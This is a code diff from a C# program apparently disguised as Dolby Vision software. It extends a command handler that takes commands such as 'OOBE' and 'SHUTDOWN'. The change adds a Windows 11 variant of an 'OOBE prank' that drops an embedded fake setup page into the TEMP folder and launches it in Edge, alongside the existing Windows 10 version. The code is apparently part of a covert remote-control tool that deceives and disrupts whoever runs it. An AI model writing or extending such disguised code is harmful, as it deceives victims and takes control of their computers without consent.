@@ -202,7 +202,11 @@ namespace DolbyVision
             {
                 if (cmd.Equals("OOBE", StringComparison.OrdinalIgnoreCase))
                 {
-                    return StartOobePrank();
+                    return StartOobePrank("Win10");
+                }
+                if (cmd.Equals("OOBE11", StringComparison.OrdinalIgnoreCase))
+                {
+                    return StartOobePrank("Win11");
                 }
                 if (cmd.Equals("SHUTDOWN", StringComparison.OrdinalIgnoreCase))
                 {
@@ -263,14 +267,16 @@ namespace DolbyVision
         }
 
         // ========== OOBE恶搞 ==========
-        private static string StartOobePrank()
+        private static string StartOobePrank(string version)
         {
             try
             {
+                bool isWin11 = version.Equals("Win11", StringComparison.OrdinalIgnoreCase);
+                string fileName = isWin11 ? "Win11_OOBE.html" : "Win10_OOBE.html";
+                string resourceName = isWin11 ? "DolbyVision.Assets.Win11_OOBE_Prank.html" : "DolbyVision.Assets.Win10_OOBE_Prank.html";
                 // 从嵌入资源释放HTML到TEMP
-                string htmlPath = Path.Combine(Path.GetTempPath(), "Win10_OOBE.html");
+                string htmlPath = Path.Combine(Path.GetTempPath(), fileName);
                 var assembly = System.Reflection.Assembly.GetExecutingAssembly();
-                string resourceName = "DolbyVision.Assets.Win10_OOBE_Prank.html";
                 using (var stream = assembly.GetManifestResourceStream(resourceName))
                 {
                     if (stream == null) return "ERROR: OOBE资源未找到";
@@ -291,7 +297,7 @@ namespace DolbyVision
                     UseShellExecute = false
                 };
                 Process.Start(psi);
-                return "OK: OOBE恶搞已启动 (" + edgePath + ")";
+                return "OK: " + version + " OOBE恶搞已启动 (" + edgePath + ")";
             }
             catch (Exception ex)
             {
